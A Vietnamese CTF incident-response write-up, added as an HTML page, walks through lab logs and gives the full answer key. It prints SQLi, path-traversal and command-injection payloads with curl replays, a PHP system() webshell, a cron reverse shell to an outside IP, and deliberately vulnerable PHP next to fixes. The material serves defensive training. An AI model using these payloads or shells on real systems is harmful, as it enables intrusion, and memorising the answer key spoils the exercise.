@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>Write-up — Linux Security CTF Level 3 (helpdesk-01)</title>
+<style>
+  :root {
+    --bg: #0f1419;
+    --panel: #1a2332;
+    --text: #e7ecf3;
+    --muted: #9aa8bc;
+    --accent: #3d9cfd;
+    --ok: #3dd68c;
+    --warn: #f5a524;
+    --danger: #f76e6e;
+    --code: #0b1220;
+    --border: #2a3548;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: "Segoe UI", system-ui, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.65;
+  }
+  .wrap { max-width: 920px; margin: 0 auto; padding: 2rem 1.25rem 4rem; }
+  h1 { font-size: 1.75rem; margin: 0 0 .5rem; letter-spacing: -.02em; }
+  h2 { font-size: 1.35rem; margin: 2.5rem 0 .75rem; border-bottom: 1px solid var(--border); padding-bottom: .4rem; color: #fff; }
+  h3 { font-size: 1.1rem; margin: 1.75rem 0 .5rem; color: var(--accent); }
+  h4 { margin: 1.2rem 0 .4rem; color: var(--warn); font-size: 1rem; }
+  p, li { color: var(--text); }
+  .muted { color: var(--muted); }
+  .lead { font-size: 1.05rem; color: var(--muted); margin-bottom: 1.5rem; }
+  .badge {
+    display: inline-block; font-size: .75rem; padding: .15rem .5rem;
+    border-radius: 999px; background: #243044; color: var(--accent); margin-right: .35rem;
+  }
+  .badge.ans { background: #1a3a2a; color: var(--ok); }
+  .badge.warn { background: #3a2e14; color: var(--warn); }
+  nav.toc {
+    background: var(--panel); border: 1px solid var(--border);
+    border-radius: 10px; padding: 1rem 1.25rem; margin: 1.5rem 0;
+  }
+  nav.toc a { color: var(--accent); text-decoration: none; }
+  nav.toc a:hover { text-decoration: underline; }
+  nav.toc ol { margin: .5rem 0 0; padding-left: 1.25rem; }
+  pre, code {
+    font-family: ui-monospace, "Cascadia Code", Consolas, monospace;
+    font-size: .86rem;
+  }
+  pre {
+    background: var(--code);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1rem 1.1rem;
+    overflow-x: auto;
+    line-height: 1.45;
+  }
+  code { background: #152033; padding: .1rem .35rem; border-radius: 4px; }
+  pre code { background: transparent; padding: 0; }
+  .out { border-left: 3px solid var(--ok); }
+  .cmd { border-left: 3px solid var(--accent); }
+  .box {
+    background: var(--panel); border: 1px solid var(--border);
+    border-radius: 10px; padding: 1rem 1.2rem; margin: 1rem 0;
+  }
+  .box.answer { border-color: #2d6a4f; background: #13251c; }
+  .box.warn { border-color: #6b5420; background: #241c0e; }
+  table { width: 100%; border-collapse: collapse; margin: 1rem 0; font-size: .92rem; }
+  th, td { border: 1px solid var(--border); padding: .55rem .7rem; text-align: left; vertical-align: top; }
+  th { background: #152033; }
+  .prompt { color: var(--ok); user-select: none; }
+  footer { margin-top: 3rem; color: var(--muted); font-size: .85rem; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<h1>Write-up — CTF Level 3 <span class="muted">helpdesk-01</span></h1>
+<p class="lead">
+  Góc <strong>Blue Team / IR</strong>: recon → timeline log → trích IOC → nộp flag.
+  Dữ liệu dưới đây lấy từ bài thật với <code>CTF_SEED=42</code> (nếu build seed khác, <em>giá trị</em> đổi nhưng <em>cách làm</em> giữ nguyên).
+</p>
+
+<div class="box warn">
+  <strong>Lưu ý giảng viên:</strong> trang này chứa đáp án đầy đủ — chỉ chia sẻ sau buổi hoặc cho nhóm cần walkthrough.
+  Login lab web: <code>admin / admin</code>. Terminal: cổng host map tới ttyd (vd. <code>:8080</code> / <code>:8081</code>).
+</div>
+
+<nav class="toc">
+  <strong>Mục lục</strong>
+  <ol>
+    <li><a href="#prep">Chuẩn bị &amp; tư duy</a></li>
+    <li><a href="#recon">Recon: netstat / ps / log</a></li>
+    <li><a href="#timeline">Timeline attacker</a></li>
+    <li><a href="#w0">W0 — Phiên đầu</a></li>
+    <li><a href="#w1">W1 — Chuỗi lộ (SQLi)</a></li>
+    <li><a href="#w2">W2 — Cấu hình lộ (LFI)</a></li>
+    <li><a href="#w3">W3 — Lệnh lệch (OS inject)</a></li>
+    <li><a href="#f1">F1 — Webshell</a></li>
+    <li><a href="#f2">F2 — Tài khoản OS</a></li>
+    <li><a href="#f3">F3 — Cron</a></li>
+    <li><a href="#f4">F4 — SUID</a></li>
+    <li><a href="#f5">F5 — Beacon C2</a></li>
+    <li><a href="#f6">F6 — IOC</a></li>
+    <li><a href="#summary">Bảng đáp án SEED=42</a></li>
+    <li><a href="#vulns">Phân tích lỗ hổng web + source</a></li>
+  </ol>
+</nav>
+
+<!-- ========== PREP ========== -->
+<h2 id="prep">1. Chuẩn bị &amp; tư duy</h2>
+<p>Bạn vào phiên terminal CTF:</p>
+<pre class="cmd"><code><span class="prompt">$</span> ctf register &lt;callsign&gt;
+<span class="prompt">$</span> ctf login &lt;callsign&gt;
+<span class="prompt">$</span> ctf
+<span class="prompt">$</span> hostname</code></pre>
+<pre class="out"><code>helpdesk-01</code></pre>
+<p>Ticket SOC nói máy bất thường — <strong>không</strong> đưa checklist kỹ thuật. Việc của bạn: tự tìm dịch vụ, đọc log, dựng chuỗi sự cố.</p>
+<ul>
+  <li>Tối đa <strong>2 lần nộp</strong> / câu</li>
+  <li><code>ctf hint &lt;id&gt; confirm</code> trừ điểm <strong>ngay</strong> (~20%)</li>
+  <li>Đáp án có <code>|</code> phải bọc nháy: <code>ctf submit F6 'a|b|c'</code></li>
+</ul>
+
+<!-- ========== RECON ========== -->
+<h2 id="recon">2. Recon: cổng → process → log</h2>
+
+<h3>2.1. Máy đang listen gì?</h3>
+<pre class="cmd"><code><span class="prompt">analyst@helpdesk-01:/#</span> netstat -lntp
+<span class="prompt">#</span> hoặc: ss -lntp</code></pre>
+<pre class="out"><code>Proto Recv-Q Send-Q Local Address   Foreign Address  State   PID/Program name
+tcp        0      0 0.0.0.0:80      0.0.0.0:*        LISTEN  42/socat
+tcp        0      0 0.0.0.0:7681    0.0.0.0:*        LISTEN  1/ttyd</code></pre>
+<p><strong>Đọc output:</strong></p>
+<ul>
+  <li><code>:80</code> → có HTTP local → thử <code>curl http://127.0.0.1/</code></li>
+  <li><code>:7681</code> → ttyd (cổng terminal CTF), bỏ qua khi điều tra web</li>
+  <li>PID <code>42</code> giữ cổng 80 → xem process là gì</li>
+</ul>
+
+<h3>2.2. Process cổng 80 là nginx hay gì?</h3>
+<pre class="cmd"><code><span class="prompt">analyst@helpdesk-01:/#</span> ps -fp 42
+<span class="prompt">analyst@helpdesk-01:/#</span> ps -ef | grep -E 'nginx|apache|httpd|socat' | grep -v grep</code></pre>
+<pre class="out"><code>root  42  ... socat TCP-LISTEN:80 ... TCP:web:80</code></pre>
+<p>Trong lab này cổng 80 thường là <strong>socat proxy</strong> sang container web (Apache+PHP). Vẫn có HTTP tại <code>http://127.0.0.1/</code>.</p>
+<p>Nhật ký sự cố (overlay) vẫn nằm kiểu nginx access — bước tiếp theo kiểm tra <code>/var/log</code>.</p>
+
+<pre class="cmd"><code><span class="prompt">analyst@helpdesk-01:/#</span> curl -sI http://127.0.0.1/ | head -n 8
+<span class="prompt">analyst@helpdesk-01:/#</span> curl -s http://127.0.0.1/ | head -n 20</code></pre>
+<pre class="out"><code>HTTP/1.1 200 OK
+...
+&lt;h1&gt;Acme Helpdesk&lt;/h1&gt;
+&lt;form ... login ...&gt;</code></pre>
+<p>→ Có app Helpdesk (form login). Ghi chú: sẽ cần session cookie cho các bước sau.</p>
+
+<h3>2.3. /var/log có gì? Có nginx không?</h3>
+<pre class="cmd"><code><span class="prompt">analyst@helpdesk-01:/#</span> ls -la /var/log
+<span class="prompt">analyst@helpdesk-01:/#</span> ls -la /var/log/nginx</code></pre>
+<pre class="out"><code>... auth.log  syslog  nginx/  audit/ ...
+/var/log/nginx:
+access.log
+...</code></pre>
+<pre class="cmd"><code><span class="prompt">analyst@helpdesk-01:/#</span> head -n 2 /var/log/nginx/access.log
+<span class="prompt">analyst@helpdesk-01:/#</span> wc -l /var/log/nginx/access.log</code></pre>
+<pre class="out"><code>10.10.x.x - - [12/Aug/2026:...] "GET /index.php HTTP/1.1" 200 ...
+... (hàng nghìn dòng — có nhiễu + tín hiệu)</code></pre>
+
+<!-- ========== TIMELINE ========== -->
+<h2 id="timeline">3. Tìm IP nóng &amp; dựng timeline</h2>
+
+<h3>3.1. Ai đánh nhiều / hành vi lạ?</h3>
+<pre class="cmd"><code><span class="prompt">analyst@helpdesk-01:/#</span> awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head</code></pre>
+<p>Rồi lọc endpoint “đáng ngờ”:</p>
+<pre class="cmd"><code><span class="prompt">analyst@helpdesk-01:/#</span> grep -E 'login\.php|search\.php|page\.php|diag\.php|uploads/' /var/log/nginx/access.log \
+  | awk '{print $1}' | sort | uniq -c | sort -nr | head</code></pre>
+<pre class="out"><code>     22 176.133.234.178</code></pre>
+<p><strong>Attacker IP (SEED=42):</strong> <code>176.133.234.178</code></p>
+
+<h3>3.2. Toàn bộ hành vi của IP đó (sắp theo thời gian)</h3>
+<pre class="cmd"><code><span class="prompt">analyst@helpdesk-01:/#</span> grep '176.133.234.178' /var/log/nginx/access.log | sort -t'[' -k2</code></pre>
+
+<div class="box">
+<strong>Timeline thật (SEED=42) — đã rút gọn:</strong>
+<table>
+  <tr><th>Thời gian</th><th>Request</th><th>Ý nghĩa IR</th></tr>
+  <tr><td>02:11:04</td><td><code>POST /login.php</code> → 302</td><td>Đăng nhập web</td></tr>
+  <tr><td>02:11:05</td><td><code>GET /index.php?welcome=admin</code> (user <code>admin</code>)</td><td>Vào được với <code>admin</code></td></tr>
+  <tr><td>02:14:22</td><td><code>search.php?q=' UNION SELECT...</code></td><td>SQLi</td></tr>
+  <tr><td>02:14:23</td><td><code>...note=hdk_695c024ed1f3</code></td><td>Token lộ</td></tr>
+  <tr><td>02:18:01</td><td><code>page.php?file=../../.env</code></td><td>Path traversal</td></tr>
+  <tr><td>02:18:02</td><td><code>...hit=APP_KEY%3D1005140e80b5b3</code></td><td>Cấu hình lộ</td></tr>
+  <tr><td>02:21:40</td><td><code>diag.php?host=127.0.0.1%3Buname</code></td><td>OS inject → <code>uname</code></td></tr>
+  <tr><td>02:25–02:38</td><td>nhiều <code>POST /uploads/media_4256.php</code></td><td>Webshell</td></tr>
+</table>
+</div>
+
+<!-- ========== W0 ========== -->
+<h2 id="w0"><span class="badge">W0</span> Phiên đầu</h2>
+<p class="muted">Brief: Tài khoản nào xuất hiện đầu trong khung giờ sự cố?</p>
+
+<h4>Bước làm</h4>
+<pre class="cmd"><code><span class="prompt">#</span> Lọc login / welcome của attacker
+grep '176.133.234.178' /var/log/nginx/access.log | grep -E 'login|welcome'</code></pre>
+<pre class="out"><code>176.133.234.178 - - [12/Aug/2026:02:11:04 +0000] "POST /login.php HTTP/1.1" 302 0
+176.133.234.178 - admin [12/Aug/2026:02:11:05 +0000] "GET /index.php?welcome=admin HTTP/1.1" 200 4120</code></pre>
+<p>Field user = <code>admin</code>, query <code>welcome=admin</code> → tài khoản vào app là <strong>admin</strong>.</p>
+
+<h4>Đối chiếu live (optional)</h4>
+<pre class="cmd"><code>curl -s -c /tmp/c.jar -b /tmp/c.jar -L \
+  -d 'user=admin&amp;pass=admin' \
+  http://127.0.0.1/login.php | head</code></pre>
+
+<div class="box answer">
+  <span class="badge ans">Đáp án W0</span> <code>admin</code><br/>
+  <code>ctf submit W0 admin</code>
+</div>
+
+<!-- ========== W1 ========== -->
+<h2 id="w1"><span class="badge">W1</span> Chuỗi lộ (SQLi)</h2>
+<p class="muted">Brief: Chuỗi bí mật nào gắn với truy vấn lệch mẫu?</p>
+
+<h4>Bước 1 — Thấy gì trong log?</h4>
+<pre class="cmd"><code>grep '176.133.234.178' /var/log/nginx/access.log | grep search.php</code></pre>
+<pre class="out"><code>176.133.234.178 - admin [12/Aug/2026:02:14:22 +0000] "GET /search.php?q=%27+UNION+SELECT+username%2Ctoken+FROM+secrets-- HTTP/1.1" 200 695
+176.133.234.178 - admin [12/Aug/2026:02:14:23 +0000] "GET /search.php?q=token_hit&amp;note=hdk_695c024ed1f3 HTTP/1.1" 200 180</code></pre>
+
+<h4>Bước 2 — Decode URL</h4>
+<pre class="cmd"><code>python3 - &lt;&lt;'PY'
+import urllib.parse
+print(urllib.parse.unquote("%27+UNION+SELECT+username%2Ctoken+FROM+secrets--"))
+print(urllib.parse.unquote("note=hdk_695c024ed1f3"))
+PY</code></pre>
+<pre class="out"><code>' UNION SELECT username,token FROM secrets--
+note=hdk_695c024ed1f3</code></pre>
+<p>Log đã ghi rõ token: <code>hdk_695c024ed1f3</code>. Có thể nộp luôn từ log (Blue Team ưu tiên bằng chứng đã ghi).</p>
+
+<h4>Bước 3 — Tái hiện (cần cookie; query app thật dùng 3 cột)</h4>
+<pre class="cmd"><code>curl -s -c /tmp/c.jar -b /tmp/c.jar -L \
+  -d 'user=admin&amp;pass=admin' http://127.0.0.1/login.php >/dev/null
+
+curl -s -b /tmp/c.jar \
+  "http://127.0.0.1/search.php?q='+UNION+SELECT+1,username,token+FROM+secrets--" \
+  | tee /tmp/w1.html
+
+grep -oE 'hdk_[a-z0-9]+' /tmp/w1.html</code></pre>
+<pre class="out"><code>hdk_695c024ed1f3</code></pre>
+<p><strong>Kỹ thuật:</strong> SQLi UNION. App SELECT <code>id, title, body</code> (3 cột) → payload live nên là <code>1,username,token</code>.</p>
+
+<div class="box answer">
+  <span class="badge ans">Đáp án W1</span> <code>hdk_695c024ed1f3</code><br/>
+  <code>ctf submit W1 hdk_695c024ed1f3</code>
+</div>
+
+<!-- ========== W2 ========== -->
+<h2 id="w2"><span class="badge">W2</span> Cấu hình lộ (path traversal)</h2>
+<p class="muted">Brief: Chuỗi cấu hình nào bị kéo ra ngoài chỗ lẽ ra phải ở?</p>
+
+<pre class="cmd"><code>grep '176.133.234.178' /var/log/nginx/access.log | grep page.php</code></pre>
+<pre class="out"><code>176.133.234.178 - admin [12/Aug/2026:02:18:01 +0000] "GET /page.php?file=..%2F..%2F.env HTTP/1.1" 200 96
+176.133.234.178 - admin [12/Aug/2026:02:18:02 +0000] "GET /page.php?file=.env&amp;hit=APP_KEY%3D1005140e80b5b3 HTTP/1.1" 200 96</code></pre>
+<pre class="cmd"><code>python3 -c "import urllib.parse; print(urllib.parse.unquote('APP_KEY%3D1005140e80b5b3'))"
+cat /var/www/html/.env</code></pre>
+<pre class="out"><code>APP_KEY=1005140e80b5b3
+APP_KEY=1005140e80b5b3
+DB_HOST=127.0.0.1</code></pre>
+<pre class="cmd"><code>curl -s -b /tmp/c.jar 'http://127.0.0.1/page.php?file=.env'</code></pre>
+
+<div class="box answer">
+  <span class="badge ans">Đáp án W2</span> <code>APP_KEY=1005140e80b5b3</code> (cả dòng)<br/>
+  <code>ctf submit W2 'APP_KEY=1005140e80b5b3'</code>
+</div>
+
+<!-- ========== W3 ========== -->
+<h2 id="w3"><span class="badge">W3</span> Lệnh lệch (OS command injection)</h2>
+<p class="muted">Brief: Lệnh hệ thống nào xuất hiện ngoài luồng vận hành bình thường?</p>
+
+<pre class="cmd"><code>grep '176.133.234.178' /var/log/nginx/access.log | grep diag.php</code></pre>
+<pre class="out"><code>176.133.234.178 - admin [12/Aug/2026:02:21:40 +0000] "GET /diag.php?host=127.0.0.1%3Buname HTTP/1.1" 200 120</code></pre>
+<pre class="cmd"><code>python3 -c "import urllib.parse; print(urllib.parse.unquote('127.0.0.1%3Buname'))"</code></pre>
+<pre class="out"><code>127.0.0.1;uname</code></pre>
+<p><code>%3B</code> = <code>;</code> → nối lệnh sau <code>ping</code>. Lệnh inject = <strong>uname</strong>.</p>
+<pre class="cmd"><code>curl -s -b /tmp/c.jar 'http://127.0.0.1/diag.php?host=127.0.0.1;uname'</code></pre>
+
+<div class="box answer">
+  <span class="badge ans">Đáp án W3</span> <code>uname</code><br/>
+  <code>ctf submit W3 uname</code>
+</div>
+
+<!-- ========== F1 ========== -->
+<h2 id="f1"><span class="badge">F1</span> Tệp lạ (webshell)</h2>
+<p class="muted">Brief: Tên tệp nào nhận request lặp bất thường?</p>
+
+<pre class="cmd"><code>grep 'POST /uploads/' /var/log/nginx/access.log \
+  | sed -n 's/.*POST \/uploads\/\([^ ]*\) .*/\1/p' \
+  | sort | uniq -c | sort -nr</code></pre>
+<pre class="out"><code>     14 media_4256.php</code></pre>
+<pre class="cmd"><code>ls -la /var/www/html/uploads/
+cat /var/www/html/uploads/media_4256.php</code></pre>
+<pre class="out"><code>&lt;?php
+if(isset($_REQUEST['c'])){ system($_REQUEST['c']); }
+?&gt;</code></pre>
+
+<div class="box answer">
+  <span class="badge ans">Đáp án F1</span> <code>media_4256.php</code> (chỉ tên file)<br/>
+  <code>ctf submit F1 media_4256.php</code>
+</div>
+
+<!-- ========== F2 ========== -->
+<h2 id="f2"><span class="badge">F2</span> Tài khoản hệ thống sau foothold</h2>
+<p class="muted">Brief: Tài khoản hệ thống nào đăng nhập thành công sau mốc vào ban đầu?</p>
+
+<pre class="cmd"><code>ls -la /var/log/auth.log
+grep 'Accepted password' /var/log/auth.log | grep '176.133.234.178'</code></pre>
+<pre class="out"><code>... Accepted password for oracle from 176.133.234.178 port 43662 ssh2</code></pre>
+<p>Cùng IP attacker trên access log → user OS bị dùng tiếp: <strong>oracle</strong>.</p>
+<pre class="cmd"><code>grep '^oracle:' /etc/passwd</code></pre>
+
+<div class="box answer">
+  <span class="badge ans">Đáp án F2</span> <code>oracle</code><br/>
+  <code>ctf submit F2 oracle</code>
+</div>
+
+<!-- ========== F3 ========== -->
+<h2 id="f3"><span class="badge">F3</span> Việc định kỳ (cron)</h2>
+<p class="muted">Brief: Mục định kỳ nào không giống phần còn lại của hệ thống?</p>
+
+<pre class="cmd"><code>ls -la /etc/cron.d/
+for f in /etc/cron.d/*; do echo "===== $f ====="; cat "$f"; echo; done</code></pre>
+<pre class="out"><code>===== /etc/cron.d/.cache =====
+# managed job
+*/5 * * * * root echo YmFzaCAtaSA+JiAvZGV2L3RjcC80NS41Ny43My4yNTQvOTAwMSAwPiYx | base64 -d | bash</code></pre>
+<pre class="cmd"><code>echo YmFzaCAtaSA+JiAvZGV2L3RjcC80NS41Ny43My4yNTQvOTAwMSAwPiYx | base64 -d</code></pre>
+<pre class="out"><code>bash -i &gt;&amp; /dev/tcp/45.57.73.254/9001 0&gt;&amp;1</code></pre>
+<p>Tên file lạ <code>.cache</code> + reverse shell → đây là persistence. <strong>Đáp án F3 = tên file cron</strong>.</p>
+
+<div class="box answer">
+  <span class="badge ans">Đáp án F3</span> <code>.cache</code><br/>
+  <code>ctf submit F3 .cache</code>
+</div>
+
+<!-- ========== F4 ========== -->
+<h2 id="f4"><span class="badge">F4</span> Quyền lệch (SUID)</h2>
+<p class="muted">Brief: Đường dẫn nào có quyền không khớp vai trò?</p>
+
+<pre class="cmd"><code>find / -perm -4000 -type f 2&gt;/dev/null</code></pre>
+<pre class="out"><code>/usr/bin/passwd
+/usr/bin/sudo
+...
+/opt/.sysd/bash</code></pre>
+<pre class="cmd"><code>ls -l /opt/.sysd/bash
+file /opt/.sysd/bash</code></pre>
+<pre class="out"><code>-rwsr-xr-x ... /opt/.sysd/bash
+... setuid ...</code></pre>
+<p>Path ẩn + SUID bash → backdoor leo quyền.</p>
+
+<div class="box answer">
+  <span class="badge ans">Đáp án F4</span> <code>/opt/.sysd/bash</code><br/>
+  <code>ctf submit F4 /opt/.sysd/bash</code>
+</div>
+
+<!-- ========== F5 ========== -->
+<h2 id="f5"><span class="badge">F5</span> Đích lặp (beacon / C2)</h2>
+<p class="muted">Brief: Đích nào lặp lại trên lưu lượng thu được?</p>
+
+<pre class="cmd"><code>ls -la /opt/
+file /opt/capture.pcap
+tcpdump -nn -r /opt/capture.pcap 2&gt;/dev/null | head -n 30</code></pre>
+<p>Đếm đích xuất hiện nhiều / đều (tách nhiễu 8.8.8.8, CDN…):</p>
+<pre class="cmd"><code>tcpdump -nn -r /opt/capture.pcap 2&gt;/dev/null \
+  | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' \
+  | sed 's/\.[0-9]*$//' \
+  | sort | uniq -c | sort -nr | head</code></pre>
+<p>Beacon đều ~60s trỏ <strong>193.176.133.39</strong> (SEED=42).</p>
+
+<div class="box answer">
+  <span class="badge ans">Đáp án F5</span> <code>193.176.133.39</code><br/>
+  <code>ctf submit F5 193.176.133.39</code>
+</div>
+
+<!-- ========== F6 ========== -->
+<h2 id="f6"><span class="badge">F6</span> IOC — ghép báo cáo</h2>
+<p class="muted">Brief: Ghép ba IOC đã tìm (cách nhau bởi |).</p>
+
+<div class="box">
+  <strong>IOC</strong> = Indicator of Compromise — dấu hiệu máy đã bị xâm nhập (nhiều <em>loại</em> bằng chứng).<br/><br/>
+  F6 <strong>không</strong> phải ghép 3 IP hacker.<br/>
+  Ghép theo <strong>diễn biến sự cố</strong>:
+  <ol>
+    <li>User vào web (W0) → <code>admin</code></li>
+    <li>Cửa hậu để lại (F1) → <code>media_4256.php</code></li>
+    <li>Đích gọi ra sau đó (F5) → <code>193.176.133.39</code></li>
+  </ol>
+</div>
+
+<pre class="cmd"><code>ctf submit F6 'admin|media_4256.php|193.176.133.39'</code></pre>
+<p>Bọc <code>'...'</code> để bash không hiểu <code>|</code> là pipe.</p>
+
+<div class="box answer">
+  <span class="badge ans">Đáp án F6</span> <code>admin|media_4256.php|193.176.133.39</code>
+</div>
+
+<!-- ========== SUMMARY ========== -->
+<h2 id="summary">Bảng đáp án đầy đủ — SEED = 42</h2>
+<table>
+  <tr><th>ID</th><th>Title</th><th>Đáp án</th><th>Điểm gốc</th></tr>
+  <tr><td>W0</td><td>Phiên đầu</td><td><code>admin</code></td><td>100</td></tr>
+  <tr><td>W1</td><td>Chuỗi lộ</td><td><code>hdk_695c024ed1f3</code></td><td>100</td></tr>
+  <tr><td>W2</td><td>Cấu hình lộ</td><td><code>APP_KEY=1005140e80b5b3</code></td><td>250</td></tr>
+  <tr><td>W3</td><td>Lệnh lệch</td><td><code>uname</code></td><td>500</td></tr>
+  <tr><td>F1</td><td>Tệp lạ</td><td><code>media_4256.php</code></td><td>100</td></tr>
+  <tr><td>F2</td><td>Tài khoản sau</td><td><code>oracle</code></td><td>250</td></tr>
+  <tr><td>F3</td><td>Việc định kỳ</td><td><code>.cache</code></td><td>250</td></tr>
+  <tr><td>F4</td><td>Quyền lệch</td><td><code>/opt/.sysd/bash</code></td><td>250</td></tr>
+  <tr><td>F5</td><td>Đích lặp</td><td><code>193.176.133.39</code></td><td>500</td></tr>
+  <tr><td>F6</td><td>IOC</td><td><code>admin|media_4256.php|193.176.133.39</code></td><td>750</td></tr>
+</table>
+<p><strong>Tổng tối đa:</strong> 3050 điểm (chưa trừ hint).</p>
+
+<div class="box">
+  <strong>Chuỗi lệnh xương sống (nhớ thuộc):</strong>
+  <pre class="cmd" style="margin:0.6rem 0 0"><code>netstat -lntp
+ps -fp &lt;PID&gt;
+ls /var/log /var/log/nginx
+awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head
+grep '&lt;IP&gt;' /var/log/nginx/access.log | sort
+grep 'Accepted password' /var/log/auth.log | grep '&lt;IP&gt;'
+ls /etc/cron.d; cat /etc/cron.d/*
+find / -perm -4000 -type f 2&gt;/dev/null
+tcpdump -nn -r /opt/capture.pcap | head</code></pre>
+</div>
+
+<!-- ========== VULN ANALYSIS ========== -->
+<h2 id="vulns">Phân tích lỗ hổng web (kèm source)</h2>
+<p class="lead" style="margin-top:0">
+  Phần này dành cho Blue Team / DevSecOps: hiểu <em>vì sao</em> attacker làm được những gì đã thấy trên log,
+  map code → CWE → cách vá. Source lấy từ app lab <code>web/app/*.php</code> và webshell trên overlay.
+</p>
+
+<div class="box">
+  <strong>Bản đồ bề mặt tấn công</strong>
+  <table>
+    <tr><th>File</th><th>Lỗ hổng</th><th>CWE</th><th>Flag liên quan</th></tr>
+    <tr><td><code>login.php</code></td><td>Default / hard-coded credentials</td><td>CWE-798 / CWE-521</td><td>W0</td></tr>
+    <tr><td><code>search.php</code></td><td>SQL Injection (string concat)</td><td>CWE-89</td><td>W1</td></tr>
+    <tr><td><code>page.php</code></td><td>Path traversal / arbitrary file read</td><td>CWE-22</td><td>W2</td></tr>
+    <tr><td><code>diag.php</code></td><td>OS command injection</td><td>CWE-78</td><td>W3</td></tr>
+    <tr><td><code>uploads/*.php</code></td><td>Webshell (RCE sau khi đã ghi file)</td><td>CWE-94 / CWE-434</td><td>F1</td></tr>
+  </table>
+  <p class="muted" style="margin-bottom:0">Authz: <code>require_login()</code> có chặn chưa login — nhưng mọi lỗ hổng trên nằm <em>sau</em> login yếu, nên default cred = điểm vào chuỗi.</p>
+</div>
+
+<!-- V1 -->
+<h3>V1 — Default credentials (<code>login.php</code>)</h3>
+<p><span class="badge warn">CWE-798</span> Hard-coded / default password · liên quan <strong>W0</strong></p>
+
+<pre class="cmd"><code>&lt;?php
+require __DIR__ . '/common.php';
+$err = '';
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+  $u = isset($_POST['user']) ? (string)$_POST['user'] : '';
+  $p = isset($_POST['pass']) ? (string)$_POST['pass'] : '';
+  // intentional default creds
+  if ($u === 'admin' &amp;&amp; $p === 'admin') {
+    $_SESSION['user'] = 'admin';
+    header('Location: /index.php?welcome=admin');
+    exit;
+  }
+  $err = 'Invalid credentials';
+}
+?&gt;</code></pre>
+
+<p><strong>Phân tích:</strong></p>
+<ul>
+  <li>So khớp cứng <code>admin/admin</code> trong source — không hash, không MFA, không đổi bắt buộc lần đầu.</li>
+  <li>Attacker (và người điều tra) đoán được credential phổ biến lúc dựng máy.</li>
+  <li>Sau login, session PHP mở cửa toàn bộ endpoint nguy hiểm bên dưới.</li>
+</ul>
+<p><strong>Dấu hiệu trên log (SEED=42):</strong></p>
+<pre class="out"><code>POST /login.php → 302
+GET /index.php?welcome=admin (user field = admin)</code></pre>
+<p><strong>Cách vá (Blue Team / Dev):</strong></p>
+<ul>
+  <li>Cấm default password; bắt đổi pass lần đầu; dùng hash (argon2id/bcrypt) + salt.</li>
+  <li>Rate-limit / lockout login; cảnh báo SOC khi login từ IP lạ.</li>
+  <li>Không hard-code secret trong source — đưa ra secret manager / env được bảo vệ.</li>
+</ul>
+
+<!-- V2 -->
+<h3>V2 — SQL Injection (<code>search.php</code>)</h3>
+<p><span class="badge warn">CWE-89</span> SQL Injection · liên quan <strong>W1</strong></p>
+
+<pre class="cmd"><code>&lt;?php
+require __DIR__ . '/common.php';
+require_login();
+$q = isset($_GET['q']) ? (string)$_GET['q'] : '';
+$rows = [];
+$error = '';
+if ($q !== '') {
+  // intentional SQLi
+  $sql = "SELECT id, title, body FROM tickets WHERE title LIKE '%" . $q . "%'";
+  try {
+    $rows = db()-&gt;query($sql)-&gt;fetchAll(PDO::FETCH_ASSOC);
+  } catch (Exception $e) {
+    $error = $e-&gt;getMessage();
+  }
+}
+?&gt;</code></pre>
+
+<p><strong>Phân tích:</strong></p>
+<ul>
+  <li><code>$q</code> từ <code>$_GET</code> được <strong>nối thẳng</strong> vào SQL → attacker đóng chuỗi <code>'</code> và chèn <code>UNION SELECT ...</code>.</li>
+  <li>Query gốc chọn <strong>3 cột</strong> (<code>id, title, body</code>) → UNION phải khớp 3 cột (lab: <code>1,username,token</code>).</li>
+  <li>Bảng <code>secrets</code> chứa token nhạy cảm → lộ qua cùng connection SQLite.</li>
+  <li><code>htmlspecialchars</code> chỉ bảo vệ XSS khi <em>in</em> ra HTML — <strong>không</strong> chống SQLi.</li>
+</ul>
+<p><strong>Payload đã thấy trên log:</strong></p>
+<pre class="out"><code>q=' UNION SELECT username,token FROM secrets--
+→ note=hdk_695c024ed1f3</code></pre>
+<p><strong>Code an toàn (ý tưởng vá):</strong></p>
+<pre class="cmd"><code>$stmt = db()-&gt;prepare('SELECT id, title, body FROM tickets WHERE title LIKE ?');
+$stmt-&gt;execute(['%' . $q . '%']);
+$rows = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);
+// Tách quyền: account app không được SELECT secrets; secrets không nằm cùng DB public</code></pre>
+
+<!-- V3 -->
+<h3>V3 — Path traversal / Arbitrary file read (<code>page.php</code>)</h3>
+<p><span class="badge warn">CWE-22</span> Path Traversal · liên quan <strong>W2</strong></p>
+
+<pre class="cmd"><code>&lt;?php
+require __DIR__ . '/common.php';
+require_login();
+$file = isset($_GET['file']) ? (string)$_GET['file'] : 'readme.txt';
+// intentional path traversal — only under docroot-ish
+$base = __DIR__;
+$path = $base . '/' . $file;
+$content = '';
+if (is_file($path)) {
+  $content = file_get_contents($path);
+} else {
+  $content = 'not found';
+}
+?&gt;</code></pre>
+
+<p><strong>Phân tích:</strong></p>
+<ul>
+  <li><code>$file</code> gắn trực tiếp sau <code>$base/</code> — không canonicalize, không allowlist.</li>
+  <li><code>../</code> hoặc đơn giản <code>.env</code> (cùng docroot) → đọc secret cấu hình.</li>
+  <li>Trên log SEED=42: <code>file=../../.env</code> và <code>hit=APP_KEY=...</code>.</li>
+</ul>
+<p><strong>Cách vá:</strong></p>
+<pre class="cmd"><code>$allowed = ['readme.txt', 'faq.txt'];
+if (!in_array($file, $allowed, true)) { http_response_code(400); exit; }
+$realBase = realpath($base);
+$realPath = realpath($base . DIRECTORY_SEPARATOR . $file);
+if ($realPath === false || strpos($realPath, $realBase) !== 0) { exit; }
+$content = file_get_contents($realPath);
+// Không đặt .env trong webroot; dùng env ngoài document root</code></pre>
+
+<!-- V4 -->
